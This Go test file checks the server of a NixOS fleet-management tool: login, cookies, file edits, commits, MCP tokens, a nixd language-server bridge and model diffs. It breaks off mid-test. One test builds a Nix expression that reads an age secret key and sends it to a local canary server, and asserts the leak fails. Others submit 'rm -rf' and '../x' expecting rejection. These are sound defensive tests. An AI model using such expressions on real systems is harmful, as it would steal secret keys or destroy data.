package server

import (
	"bufio"
	"compress/gzip"
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"sync/atomic"
	"syscall"
	"testing"
	"testing/fstest"
	"time"

	"github.com/coder/websocket"
	"github.com/modelcontextprotocol/go-sdk/mcp"
	"golang.org/x/crypto/bcrypt"

	"github.com/TheOlympusCloud/nixos-manager/internal/auth"
	"github.com/TheOlympusCloud/nixos-manager/internal/core"
	"github.com/TheOlympusCloud/nixos-manager/internal/fakesops"
	"github.com/TheOlympusCloud/nixos-manager/internal/mcpserver"
)

func TestMain(m *testing.M) {
	fakesops.Main() // when a test runs this binary as sops, age-keygen or ssh-to-age
	if os.Getenv("FAKE_NIXD") == "1" {
		fakeNixd()
		return
	}
	os.Setenv("GIT_CONFIG_GLOBAL", os.DevNull)
	os.Setenv("GIT_CONFIG_NOSYSTEM", "1")
	os.Unsetenv("GIT_CONFIG_COUNT")
	os.Exit(m.Run())
}

// fakeNixd answers initialize, then asks for its configuration the way nixd
// does and reports what it got back as a notification.
func fakeNixd() {
	if f := os.Getenv("FAKE_NIXD_PIDFILE"); f != "" {
		os.WriteFile(f, []byte(strconv.Itoa(os.Getpid())), 0o644)
	}
	br := bufio.NewReader(os.Stdin)
	send := func(v any) {
		b, _ := json.Marshal(v)
		os.Stdout.WriteString("Content-Length: " + strconv.Itoa(len(b)) + "\r\n\r\n" + string(b))
	}
	for {
		msg, err := readFrame(br)
		if err != nil {
			return
		}
		var m map[string]any
		json.Unmarshal(msg, &m)
		switch {
		case m["method"] == "initialize":
			caps := m["params"].(map[string]any)["capabilities"].(map[string]any)
			send(map[string]any{"jsonrpc": "2.0", "id": m["id"], "result": map[string]any{"capabilities": map[string]any{}, "sawConfigCapability": caps["workspace"].(map[string]any)["configuration"], "nixConfig": os.Getenv("NIX_CONFIG")}})
			send(map[string]any{"jsonrpc": "2.0", "id": 99, "method": "workspace/configuration", "params": map[string]any{"items": []any{map[string]any{"section": "nixd"}}}})
		case m["id"] == float64(99):
			send(map[string]any{"jsonrpc": "2.0", "method": "test/config", "params": m["result"]})
		}
	}
}

type env struct {
	srv    *httptest.Server
	client *http.Client
	auth   *auth.Auth
	svc    *core.Service
	s      *Server
}

func newEnv(t *testing.T) *env {
	t.Helper()
	repo, err := core.OpenRepo(filepath.Join(t.TempDir(), "repo"), "", "Test User", "test@example.invalid")
	if err != nil {
		t.Fatal(err)
	}
	svc := core.NewService(repo)
	nix := filepath.Join(t.TempDir(), "nix")
	// Evaluations answer a flake without machines, so a check builds nothing; the rest echoes.
	os.WriteFile(nix, []byte("#!/bin/sh\ncase \"$*\" in *\" hash path \"*) echo sha256-fake; exit ;; esac\ncase \"$*\" in *\"eval --json\"*) echo '{\"nixos\":[],\"home\":[],\"darwin\":[]}'; exit ;; esac\necho \"nix $*\"\n"), 0o755)
	svc.Jobs.Nix = nix
	tools := fakesops.Tools(t)
	svc.Secrets = core.OpenSecrets(t.TempDir(), repo)
	svc.Secrets.Sops, svc.Secrets.AgeKeygen, svc.Secrets.SSHToAge = tools.Sops, tools.AgeKeygen, tools.SSHToAge
	hash, _ := bcrypt.GenerateFromPassword([]byte("pw"), bcrypt.MinCost) // tests log in often; -race slows bcrypt a lot
	a, err := auth.New(string(hash), filepath.Join(t.TempDir(), "tokens.json"))
	if err != nil {
		t.Fatal(err)
	}
	exe, _ := os.Executable()
	s := &Server{Svc: svc, Auth: a, MCP: mcpserver.Handler(svc, "test"), Nixd: []string{exe},
		UI: fstest.MapFS{"index.html": {Data: []byte("<!doctype html>app")}, "assets/app.js": {Data: []byte("js")}}}
	srv := httptest.NewServer(s.Handler())
	t.Cleanup(srv.Close)
	jar, _ := cookiejar.New(nil)
	return &env{srv: srv, client: &http.Client{Jar: jar}, auth: a, svc: svc, s: s}
}

// do sends a request; a non-nil body is sent as JSON. It decodes JSON replies into out.
func (e *env) do(t *testing.T, method, path string, body any, out any) int {
	t.Helper()
	var rd io.Reader
	if body != nil {
		b, _ := json.Marshal(body)
		rd = strings.NewReader(string(b))
	}
	req, _ := http.NewRequest(method, e.srv.URL+path, rd)
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}
	resp, err := e.client.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	if out != nil {
		json.NewDecoder(resp.Body).Decode(out)
	}
	return resp.StatusCode
}

func (e *env) login(t *testing.T) {
	t.Helper()
	if code := e.do(t, "POST", "/api/login", map[string]string{"password": "pw"}, nil); code != 204 {
		t.Fatalf("login: %d", code)
	}
}

func TestEverythingNeedsLogin(t *testing.T) {
	e := newEnv(t)
	for _, p := range []string{"/api/tree", "/api/status", "/api/info", "/api/tokens", "/api/lsp"} {
		if code := e.do(t, "GET", p, nil, nil); code != 401 {
			t.Errorf("GET %s without login: %d", p, code)
		}
	}
	var er struct{ Error string }
	if code := e.do(t, "POST", "/api/login", map[string]string{"password": "nope"}, &er); code != 401 || er.Error == "" {
		t.Fatalf("wrong password: %d %+v", code, er)
	}
	e.login(t)
	if code := e.do(t, "GET", "/api/tree", nil, nil); code != 200 {
		t.Fatalf("tree after login: %d", code)
	}
	e.do(t, "POST", "/api/logout", struct{}{}, nil)
	if code := e.do(t, "GET", "/api/tree", nil, nil); code != 401 {
		t.Fatalf("tree after logout: %d", code)
	}
}

func TestNonJSONWritesRefused(t *testing.T) {
	e := newEnv(t)
	e.login(t)
	resp, err := e.client.Post(e.srv.URL+"/api/mkdir", "application/x-www-form-urlencoded", strings.NewReader("path=x"))
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if resp.StatusCode != 415 {
		t.Fatalf("form post: %d", resp.StatusCode)
	}
}

func TestSecurityHeadersAndCookie(t *testing.T) {
	e := newEnv(t)
	req, _ := http.NewRequest("POST", e.srv.URL+"/api/login", strings.NewReader(`{"password":"pw"}`))
	req.Header.Set("Content-Type", "application/json")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if !strings.Contains(resp.Header.Get("Content-Security-Policy"), "frame-ancestors 'none'") {
		t.Fatal("missing CSP")
	}
	c := resp.Cookies()[0]
	if !c.HttpOnly || c.SameSite != http.SameSiteStrictMode {
		t.Fatalf("cookie %+v", c)
	}
}

func TestFileAndCommitFlowOverHTTP(t *testing.T) {
	e := newEnv(t)
	e.login(t)
	var w struct{ Hash string }
	if code := e.do(t, "PUT", "/api/file", map[string]string{"path": "flake.nix", "content": "{ }\n", "base_hash": ""}, &w); code != 200 || w.Hash == "" {
		t.Fatalf("create: %d", code)
	}
	if code := e.do(t, "PUT", "/api/file", map[string]string{"path": "flake.nix", "content": "x", "base_hash": "old"}, nil); code != 409 {
		t.Fatalf("stale save: %d", code)
	}
	if code := e.do(t, "PUT", "/api/file", map[string]string{"path": "flake.nix", "content": "{ a = 1; }\n", "base_hash": w.Hash}, nil); code != 200 {
		t.Fatalf("save: %d", code)
	}
	var f struct{ Content string }
	e.do(t, "GET", "/api/file?path=flake.nix", nil, &f)
	if f.Content != "{ a = 1; }\n" {
		t.Fatalf("read back %q", f.Content)
	}
	if code := e.do(t, "GET", "/api/file?path=../x", nil, nil); code != 400 {
		t.Fatalf("escape: %d", code)
	}

	e.do(t, "POST", "/api/stage", map[string]any{"paths": []string{}}, nil)
	if code := e.do(t, "POST", "/api/commit", map[string]any{"message": "feat: flake"}, nil); code != 412 {
		t.Fatalf("unchecked commit: %d", code)
	}
	var job struct{ ID string }
	if code := e.do(t, "POST", "/api/jobs", map[string]any{"kind": "check", "targets": []string{"nixosConfigurations.web.config.system.build.toplevel"}}, &job); code != 200 {
		t.Fatalf("submit: %d", code)
	}

	// The event stream replays the output and ends with done.
	resp, err := e.client.Get(e.srv.URL + "/api/jobs/" + job.ID + "/events")
	if err != nil {
		t.Fatal(err)
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	if !strings.Contains(string(body), "event: output") || !strings.Contains(string(body), "event: done\ndata: {\"state\":\"passed\"}") {
		t.Fatalf("events:\n%s", body)
	}

	var st core.Status
	e.do(t, "GET", "/api/status", nil, &st)
	if !st.StagedChecked {
		t.Fatal("status not checked after passing job")
	}
	var c struct{ SHA string }
	if code := e.do(t, "POST", "/api/commit", map[string]any{"message": "feat: flake"}, &c); code != 200 || c.SHA == "" {
		t.Fatalf("commit: %d", code)
	}
	var log struct{ Commits []core.Commit }
	e.do(t, "GET", "/api/log?path=flake.nix", nil, &log)
	if len(log.Commits) != 1 || log.Commits[0].SHA != c.SHA {
		t.Fatalf("log %+v", log)
	}
	var info map[string]string
	e.do(t, "GET", "/api/info", nil, &info)
	if info["author"] != "Test User <test@example.invalid>" || info["branch"] != "main" {
		t.Fatalf("info %+v", info)
	}
}

func TestTokensAndMCPOverHTTP(t *testing.T) {
	e := newEnv(t)
	e.login(t)
	var tok struct{ ID, Token string }
	if code := e.do(t, "POST", "/api/tokens", map[string]string{"name": "argus", "scope": "full"}, &tok); code != 200 || tok.Token == "" {
		t.Fatalf("create token: %d", code)
	}

	connect := func(secret string) (*mcp.ClientSession, error) {
		hc := &http.Client{Transport: bearer{secret}}
		tr := &mcp.StreamableClientTransport{Endpoint: e.srv.URL + "/mcp", HTTPClient: hc}
		return mcp.NewClient(&mcp.Implementation{Name: "t"}, nil).Connect(context.Background(), tr, nil)
	}
	if _, err := connect("wrong"); err == nil {
		t.Fatal("MCP accepted a wrong token")
	}
	cs, err := connect(tok.Token)
	if err != nil {
		t.Fatal(err)
	}
	res, err := cs.CallTool(context.Background(), &mcp.CallToolParams{Name: "write_file", Arguments: map[string]any{"path": "a.nix", "content": "1"}})
	if err != nil || res.IsError {
		t.Fatalf("write over MCP: %v %+v", err, res)
	}
	if _, _, err := e.svc.Read("a.nix"); err != nil {
		t.Fatal("MCP write not visible to the service")
	}
	for _, step := range []struct {
		tool string
		args map[string]any
	}{{"stage", nil}, {"run_check", nil}, {"commit", map[string]any{"message": "feat: a"}}} {
		if res, err := cs.CallTool(context.Background(), &mcp.CallToolParams{Name: step.tool, Arguments: step.args}); err != nil || res.IsError {
			t.Fatalf("%s over MCP: %v %+v", step.tool, err, res)
		}
	}
	cs.Close()
	if via := lastVia(t, e.svc.Repo.Dir); via != "token argus ("+tok.ID+")" {
		t.Fatalf("MCP commit Via %q", via)
	}

	if code := e.do(t, "DELETE", "/api/tokens/"+tok.ID, struct{}{}, nil); code != 204 {
		t.Fatalf("revoke: %d", code)
	}
	if _, err := connect(tok.Token); err == nil {
		t.Fatal("revoked token still works")
	}
	// A session cookie is not enough for /mcp.
	if code := e.do(t, "POST", "/mcp", map[string]any{}, nil); code != 401 {
		t.Fatalf("mcp with cookie only: %d", code)
	}
}

type bearer struct{ secret string }

func (b bearer) RoundTrip(r *http.Request) (*http.Response, error) {
	r = r.Clone(r.Context())
	r.Header.Set("Authorization", "Bearer "+b.secret)
	return http.DefaultTransport.RoundTrip(r)
}

func TestStaticUI(t *testing.T) {
	e := newEnv(t)
	for path, want := range map[string]string{"/": "app", "/history/abc": "app", "/assets/app.js": "js"} {
		resp, err := http.Get(e.srv.URL + path)
		if err != nil {
			t.Fatal(err)
		}
		b, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		if !strings.Contains(string(b), want) {
			t.Errorf("%s: %q", path, b)
		}
	}
}

// nixd evaluates a NAR-hash-pinned export of the working copy in pure mode, as
// the model does: fleet code must not read the server's files, such as the age key.
func TestLSPBridgeAnswersConfiguration(t *testing.T) {
	e := newEnv(t)
	e.login(t)
	if _, err := e.svc.Write("flake.nix", "{ outputs = _: { }; }", ""); err != nil { // not committed
		t.Fatal(err)
	}
	t.Setenv("FAKE_NIXD", "1") // inherited by the re-executed test binary acting as nixd
	t.Setenv("NIX_CONFIG", "access-tokens = github.com=x")
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	u, _ := http.NewRequest("GET", e.srv.URL, nil)
	hdr := http.Header{"Cookie": {cookieHeader(e.client.Jar.Cookies(u.URL))}}
	c, _, err := websocket.Dial(ctx, "ws"+strings.TrimPrefix(e.srv.URL, "http")+"/api/lsp", &websocket.DialOptions{HTTPHeader: hdr})
	if err != nil {
		t.Fatal(err)
	}
	defer c.CloseNow()
	c.Write(ctx, websocket.MessageText, []byte(`{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"capabilities":{}}}`))
	var gotInit, gotConfig bool
	var export string
	for !gotInit || !gotConfig {
		_, msg, err := c.Read(ctx)
		if err != nil {
			t.Fatal(err)
		}
		s := string(msg)
		switch {
		case strings.Contains(s, `"sawConfigCapability":true`):
			gotInit = true
			if !strings.Contains(s, `"nixConfig":"access-tokens = github.com=x\npure-eval = true"`) {
				t.Fatalf("nixd's Nix settings: %s", s)
			}
		case strings.Contains(s, "test/config"):
			var cfg struct {
				Params []struct {
					Nixpkgs struct{ Expr string }
					Options map[string]struct{ Expr string }
				}
			}
			if json.Unmarshal(msg, &cfg) != nil || len(cfg.Params) != 1 || len(cfg.Params[0].Options) != 3 {
				t.Fatalf("config reply: %s", s)
			}
			exprs := []string{cfg.Params[0].Nixpkgs.Expr}
			for _, o := range cfg.Params[0].Options {
				exprs = append(exprs, o.Expr)
			}
			for _, x := range exprs {
				ref, _, _ := strings.Cut(strings.TrimPrefix(x, `let f = builtins.getFlake "`), `"`)
				src, hash, _ := strings.Cut(strings.TrimPrefix(ref, "path:"), "?")
				if hash != "narHash=sha256-fake" || strings.Contains(x, e.svc.Repo.Dir) || export != "" && src != export {
					t.Fatalf("not the pinned export of the working copy: %s", x)
				}
				export = src
			}
			if !strings.Contains(cfg.Params[0].Nixpkgs.Expr, `import f.inputs.nixpkgs { system = "`+core.LocalSystem()+`"; }`) ||
				!strings.Contains(s, "nixosConfigurations") || !strings.Contains(s, "homeConfigurations") {
				t.Fatalf("config reply: %s", s)
			}
			gotConfig = true
		case strings.Contains(s, `"id":1`):
			t.Fatalf("initialize did not advertise workspace/configuration: %s", s)
		}
	}
	if b, err := os.ReadFile(filepath.Join(export, "flake.nix")); err != nil || string(b) != "{ outputs = _: { }; }" {
		t.Fatalf("export of the working copy: %q %v", b, err)
	}
	c.Close(websocket.StatusNormalClosure, "")
	for i := 0; ; i++ { // removed once nixd is gone
		if _, err := os.Stat(export); os.IsNotExist(err) {
			break
		}
		if i == 100 {
			t.Fatal("the export outlived the editor session")
		}
		time.Sleep(50 * time.Millisecond)
	}
}

func TestLSPProcessEndsWithTheSocket(t *testing.T) {
	e := newEnv(t)
	e.login(t)
	pidFile := filepath.Join(t.TempDir(), "pid")
	t.Setenv("FAKE_NIXD", "1")
	t.Setenv("FAKE_NIXD_PIDFILE", pidFile)
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	u, _ := http.NewRequest("GET", e.srv.URL, nil)
	hdr := http.Header{"Cookie": {cookieHeader(e.client.Jar.Cookies(u.URL))}}
	c, _, err := websocket.Dial(ctx, "ws"+strings.TrimPrefix(e.srv.URL, "http")+"/api/lsp", &websocket.DialOptions{HTTPHeader: hdr})
	if err != nil {
		t.Fatal(err)
	}
	c.Write(ctx, websocket.MessageText, []byte(`{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"capabilities":{}}}`))
	for { // drain until the fake has nothing more to say, like an idle nixd
		_, msg, err := c.Read(ctx)
		if err != nil {
			t.Fatal(err)
		}
		if strings.Contains(string(msg), "test/config") {
			break
		}
	}
	b, err := os.ReadFile(pidFile)
	if err != nil {
		t.Fatal(err)
	}
	pid, _ := strconv.Atoi(string(b))
	c.Close(websocket.StatusNormalClosure, "")
	// Reaped, not just killed: signal 0 also succeeds for a zombie.
	for i := 0; ; i++ {
		if syscall.Kill(pid, 0) != nil {
			break
		}
		if i == 100 {
			t.Fatal("nixd still running after the socket closed")
		}
		time.Sleep(50 * time.Millisecond)
	}
}

func TestLSPAcceptsForwardedHost(t *testing.T) {
	e := newEnv(t)
	e.login(t)
	t.Setenv("FAKE_NIXD", "1")
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	u, _ := http.NewRequest("GET", e.srv.URL, nil)
	hdr := http.Header{"Cookie": {cookieHeader(e.client.Jar.Cookies(u.URL))}, "Origin": {"https://box.tailnet.ts.net"}, "X-Forwarded-Host": {"box.tailnet.ts.net"}}
	c, _, err := websocket.Dial(ctx, "ws"+strings.TrimPrefix(e.srv.URL, "http")+"/api/lsp", &websocket.DialOptions{HTTPHeader: hdr})
	if err != nil {
		t.Fatalf("proxied origin refused: %v", err)
	}
	c.CloseNow()
	hdr.Del("X-Forwarded-Host")
	if _, _, err := websocket.Dial(ctx, "ws"+strings.TrimPrefix(e.srv.URL, "http")+"/api/lsp", &websocket.DialOptions{HTTPHeader: hdr}); err == nil {
		t.Fatal("foreign origin accepted")
	}
}

func TestLSPConnectionsAreCapped(t *testing.T) {
	e := newEnv(t)
	e.login(t)
	t.Setenv("FAKE_NIXD", "1")
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	u, _ := http.NewRequest("GET", e.srv.URL, nil)
	hdr := http.Header{"Cookie": {cookieHeader(e.client.Jar.Cookies(u.URL))}}
	url := "ws" + strings.TrimPrefix(e.srv.URL, "http") + "/api/lsp"
	for i := 0; i < maxNixd; i++ {
		c, _, err := websocket.Dial(ctx, url, &websocket.DialOptions{HTTPHeader: hdr})
		if err != nil {
			t.Fatalf("connection %d: %v", i+1, err)
		}
		defer c.CloseNow()
	}
	if _, resp, err := websocket.Dial(ctx, url, &websocket.DialOptions{HTTPHeader: hdr}); err == nil || resp == nil || resp.StatusCode != 503 {
		t.Fatalf("connection over the cap: %v %v", err, resp)
	}
}

// With real Nix and nixd (CI's Real Nix job): the editor's language server
// completes the options of the working copy's NixOS configuration, and an
// edited flake.nix there cannot send the server's age key out.
func TestLanguageServerIsPureWithRealNix(t *testing.T) {
	if os.Getenv("NIXMGR_NIX_TESTS") == "" {
		t.Skip("needs real Nix and nixd: set NIXMGR_NIX_TESTS=1")
	}
	var leaks atomic.Int32
	canary := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		leaks.Add(1)
		t.Logf("request from fleet code: %s", r.URL.Path)
	}))
	defer canary.Close()
	key := filepath.Join(t.TempDir(), "sops-age-key")
	if err := os.WriteFile(key, []byte("AGE-SECRET-KEY-1TEST"), 0o600); err != nil {
		t.Fatal(err)
	}
	e := newEnv(t)
	e.login(t)
	e.svc.Jobs.Nix = "nix"
	nixdLog := filepath.Join(t.TempDir(), "nixd.log")
	e.s.Nixd = []string{"sh", "-c", `exec nixd 2>>"$0"`, nixdLog}
	t.Cleanup(func() {
		if b, _ := os.ReadFile(nixdLog); t.Failed() {
			t.Logf("nixd's log:\n%s", b)
		}
	})
	// Each option source must evaluate: nixd answers no completion while one has no value.
	const others = `homeConfigurations.test.options = { }; darwinConfigurations.test.options = { };`
	configs := `{ test.options.canary = { }; }`
	hash, err := e.svc.Write("flake.nix", `{ outputs = _: { nixosConfigurations = `+configs+`; `+others+` }; }`, "")
	if err != nil {
		t.Fatal(err)
	}
	git := exec.Command("sh", "-c", "git add flake.nix && git -c user.name=t -c user.email=t@example.invalid commit -qm fleet")
	git.Dir = e.svc.Repo.Dir
	if out, err := git.CombinedOutput(); err != nil {
		t.Fatalf("%v: %s", err, out)
	}
	if got := complete(t, openEditor(t, e)); !slices.Contains(got, "canary") {
		t.Fatalf("completions from the fleet's options: %q", got)
	}
	// What an edit token can write: not committed, and nobody reads an error.
	leak := `builtins.seq (builtins.fetchurl "` + canary.URL + `/${builtins.readFile "` + key + `"}") ` + configs
	if _, err := e.svc.Write("flake.nix", `{ outputs = _: { nixosConfigurations = `+leak+`; `+others+` }; }`, hash); err != nil {
		t.Fatal(err)
	}
	openEditor(t, e) // the fetch would be part of the evaluation openEditor waits for
	if n := leaks.Load(); n != 0 {
		t.Fatalf("fleet code read the age key and sent it out (%d requests)", n)
	}
}

// openEditor opens the editor's language server like the Code view and waits
// until it has evaluated the option sources of its configuration.
func openEditor(t *testing.T, e *env) *websocket.Conn {
	t.Helper()
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Minute)
	defer cancel()
	u, _ := http.NewRequest("GET", e.srv.URL, nil)
	hdr := http.Header{"Cookie": {cookieHeader(e.client.Jar.Cookies(u.URL))}}
	c, _, err := websocket.Dial(ctx, "ws"+strings.TrimPrefix(e.srv.URL, "http")+"/api/lsp", &websocket.DialOptions{HTTPHeader: hdr})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { c.CloseNow() })
	for _, m := range []string{
		`{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"processId":null,"rootUri":null,"capabilities":{"window":{"workDoneProgress":true}}}}`,
		`{"jsonrpc":"2.0","method":"initialized","params":{}}`,
	} {
		c.Write(ctx, websocket.MessageText, []byte(m))
	}
	pending := []string{`"evaluated nixos"`, `"evaluated home-manager"`, `"evaluated nix-darwin"`} // nixd's progress messages
	for len(pending) > 0 {
		_, msg, err := c.Read(ctx)
		if err != nil {
			t.Fatalf("waiting for nixd to evaluate %v: %v", pending, err)
		}
		pending = slices.DeleteFunc(pending, func(p string) bool { return strings.Contains(string(msg), p) })
	}
	return c
}

// complete returns what the language server completes for "canar" in an attribute set.
func complete(t *testing.T, c *websocket.Conn) []string {
	t.Helper()
	ctx, cancel := context.WithTimeout(context.Background(), time.Minute)
	defer cancel()
	for _, m := range []string{
		`{"jsonrpc":"2.0","method":"textDocument/didOpen","params":{"textDocument":{"uri":"file:///fleet/host.nix","languageId":"nix","version":1,"text":"{ canar = { }; }"}}}`,
		`{"jsonrpc":"2.0","id":"complete","method":"textDocument/completion","params":{"textDocument":{"uri":"file:///fleet/host.nix"},"position":{"line":0,"character":7}}}`,
	} {
		c.Write(ctx, websocket.MessageText, []byte(m))
	}
	for {
		_, msg, err := c.Read(ctx)
		if err != nil {
			t.Fatalf("waiting for completions: %v", err)
		}
		var reply struct {
			ID     string // nixd's own requests have numbers
			Result struct{ Items []struct{ Label string } }
		}
		if json.Unmarshal(msg, &reply) != nil || reply.ID != "complete" {
			continue
		}
		var labels []string
		for _, it := range reply.Result.Items {
			labels = append(labels, it.Label)
		}
		return labels
	}
}

// fleetEnv serves the fixture fleet through scripts/dev/fake-nix.
func fleetEnv(t *testing.T) *env {
	t.Helper()
	e := newEnv(t)
	nix, _ := filepath.Abs("../../scripts/dev/fake-nix")
	fixtures, _ := filepath.Abs("../core/testdata/fleet")
	t.Setenv("NIXMGR_FAKE_FIXTURES", fixtures)
	e.svc.Jobs.Nix = nix
	lock, _ := os.ReadFile("../core/testdata/fleet/flake.lock")
	if _, err := e.svc.Write("flake.lock", string(lock), ""); err != nil {
		t.Fatal(err)
	}
	return e
}

// ready polls an endpoint that answers 202 while Nix works, until it answers 200.
func (e *env) ready(t *testing.T, path string, out any) {
	t.Helper()
	for i := 0; i < 200; i++ {
		var pending struct {
			State string
			Job   string
		}
		switch code := e.do(t, "GET", path, nil, &pending); code {
		case 200:
			e.do(t, "GET", path, nil, out)
			return
		case 202:
			if pending.State == "" {
				t.Fatalf("%s: 202 without a state", path)
			}
			time.Sleep(20 * time.Millisecond)
		default:
			t.Fatalf("%s: %d", path, code)
		}
	}
	t.Fatalf("%s never became ready", path)
}

func TestModelAndDiffOverHTTP(t *testing.T) {
	e := fleetEnv(t)
	e.login(t)
	var first struct{ State, Job string }
	if code := e.do(t, "GET", "/api/model?at=working", nil, &first); code != 202 || first.State != "computing" || first.Job == "" {
		t.Fatalf("first model request: %d %+v", code, first)
	}
	var res struct {
		State string
		Model core.Model
	}
	e.ready(t, "/api/model?at=working", &res)
	if res.State != "ready" || len(res.Model.Hosts) != 4 {
		t.Fatalf("model %+v", res)
	}
	var diff struct {
		State string
		Hosts []core.HostDiff
	}
	e.ready(t, "/api/model/diff", &diff)
	if len(diff.Hosts) != 4 || diff.Hosts[3].Host != "workstation" || diff.Hosts[3].Status != "added" || len(diff.Hosts[3].PackagesAdded) == 0 {
		t.Fatalf("diff against an empty history %+v", diff)
	}
	var refresh struct{ Job string }
	if code := e.do(t, "POST", "/api/model/refresh", struct{}{}, &refresh); code != 200 || refresh.Job == "" {
		t.Fatalf("refresh: %d %+v", code, refresh)
	}
	if code := e.do(t, "GET", "/api/model?at=tomorrow", nil, nil); code != 400 {
		t.Fatalf("bad at: %d", code)
	}
}

func TestManagedEditsOverHTTP(t *testing.T) {
	e := newEnv(t)
	e.login(t)
	var v core.ManagedView
	if code := e.do(t, "POST", "/api/hosts/web/packages", map[string]any{"add": []string{"git", "htop"}}, &v); code != 200 || len(v.Packages) != 2 {
		t.Fatalf("add packages: %d %+v", code, v)
	}
	if code := e.do(t, "POST", "/api/hosts/web/packages", map[string]any{"remove": []string{"htop"}}, &v); code != 200 || len(v.Packages) != 1 {
		t.Fatalf("remove packages: %d %+v", code, v)
	}
	if code := e.do(t, "POST", "/api/hosts/web/settings", map[string]any{"path": []string{"services", "openssh", "enable"}, "value": true}, &v); code != 200 {
		t.Fatalf("set option: %d", code)
	}
	var after core.ManagedView
	if code := e.do(t, "POST", "/api/hosts/web/settings", map[string]any{"path": []string{"services", "openssh", "enable"}, "unset": true}, &after); code != 200 || len(after.Settings) != 0 {
		t.Fatalf("unset option: %d %+v", code, after)
	}
	if code := e.do(t, "POST", "/api/hosts/web/settings", map[string]any{"path": []string{"time", "timeZone"}}, nil); code != 400 {
		t.Fatalf("set without a value: %d", code)
	}
	if code := e.do(t, "POST", "/api/hosts/web/packages", map[string]any{"add": []string{"rm -rf"}}, nil); code != 400 {
		t.Fatalf("bad package name: %d", code)
	}
	if code := e.do(t, "POST", "/api/hosts/web/settings", map[string]any{"path": []string{"time", "timeZone"}, "value": "UTC", "base_hash": "stale"}, nil); code != 409 {
		t.Fatalf("a form based on an old version: %d", code)
	}
	var got core.ManagedView
	e.do(t, "GET", "/api/hosts/web/managed", nil, &got)
	if got.Path != "hosts/web/managed.json" || !got.Exists || got.Packages[0] != "git" {
		t.Fatalf("managed view %+v", got)
	}
	var st core.Status
	e.do(t, "GET", "/api/status", nil, &st)
	if len(st.Files) != 1 || st.Files[0].Path != "hosts/web/managed.json" {
		t.Fatalf("an edit by clicking is not a normal change: %+v", st.Files)
	}
}

func TestSearchOverHTTP(t *testing.T) {
	e := fleetEnv(t)
	e.login(t)
	var pk struct {
		State   string
		Results []core.PackageResult
	}
	e.ready(t, "/api/search/packages?q=fire&limit=5", &pk)
	if pk.State != "ready" || len(pk.Results) == 0 || pk.Results[0].Attr != "firefox" {
		t.Fatalf("package search %+v", pk)
	}
	var op struct {
		State   string
		Results []core.OptionDoc
	}
	e.ready(t, "/api/search/options?host=workstation&q=services.openssh.", &op)
	if len(op.Results) == 0 || op.Results[0].Name != "services.openssh.enable" {
		t.Fatalf("option search %+v", op)
	}
	e.ready(t, "/api/search/options?host=workstation&exact=1&q=time.timeZone", &op)
	if len(op.Results) != 1 || op.Results[0].Name != "time.timeZone" {
		t.Fatalf("exact option %+v", op)
	}
	if code := e.do(t, "GET", "/api/search/options?host=workstation&exact=1&q=no.such", nil, nil); code != 404 {
		t.Fatalf("missing exact option: %d", code)
	}
	var job struct{ Job string }
	if code := e.do(t, "POST", "/api/search/refresh", map[string]string{"kind": "packages"}, &job); code != 200 || job.Job == "" {
		t.Fatalf("refresh: %d %+v", code, job)
	}
	if code := e.do(t, "POST", "/api/search/refresh", map[string]string{"kind": "everything"}, nil); code != 400 {
		t.Fatalf("bad refresh kind: %d", code)
	}
}

// A last commit that does not evaluate must not make every machine look new.
func TestDiffReportsABrokenHead(t *testing.T) {
	e := fleetEnv(t)
	e.login(t)
	ctx := context.Background()
	if _, err := e.svc.Write("BROKEN", "x\n", ""); err != nil {
		t.Fatal(err)
	}
	if err := e.svc.Stage(ctx, nil); err != nil {
		t.Fatal(err)
	}
	if _, err := e.svc.Commit(ctx, "chore: broken", true); err != nil {
		t.Fatal(err)
	}
	if err := e.svc.Delete("BROKEN"); err != nil {
		t.Fatal(err)
	}
	var diff struct {
		HeadError string
		Hosts     []core.HostDiff
	}
	e.ready(t, "/api/model/diff", &diff)
	if !strings.Contains(diff.HeadError, "syntax error") {
		t.Fatalf("diff against a broken commit: %+v", diff)
	}
}

func TestDiffOfOneCommit(t *testing.T) {
	e := fleetEnv(t)
	e.login(t)
	ctx := context.Background()
	if err := e.svc.Stage(ctx, nil); err != nil {
		t.Fatal(err)
	}
	sha, err := e.svc.Commit(ctx, "first", true)
	if err != nil {
		t.Fatal(err)
	}
	var diff struct {
		Hosts  []core.HostDiff
		Inputs []core.InputChange
	}
	e.ready(t, "/api/model/diff?rev="+sha, &diff)
	if len(diff.Hosts) != 4 || diff.Hosts[0].Status != "added" || len(diff.Inputs) != 3 || diff.Inputs[0].Status != "added" {
		t.Fatalf("diff of the root commit %+v", diff)
	}
	if code := e.do(t, "GET", "/api/model/diff?rev=nope", nil, nil); code != 404 {
		t.Fatalf("unknown commit: %d", code)
	}
}

// The push dialog: what the commit to push changes against what is pushed.
// Nothing is pushed yet here, so every machine of the commit is new.
func TestDiffAgainstWhatIsPushed(t *testing.T) {
	e := fleetEnv(t)
	e.login(t)
	ctx := context.Background()
	if err := e.svc.Stage(ctx, nil); err != nil {
		t.Fatal(err)
	}
	if _, err := e.svc.Commit(ctx, "first", true); err != nil {
		t.Fatal(err)
	}
	if _, err := e.svc.Write("hosts/extra.nix", "{ }\n", ""); err != nil { // not committed: not pushed by a push
		t.Fatal(err)
	}
	var diff struct {
		Hosts []core.HostDiff
	}
	e.ready(t, "/api/model/diff?against=pushed", &diff)
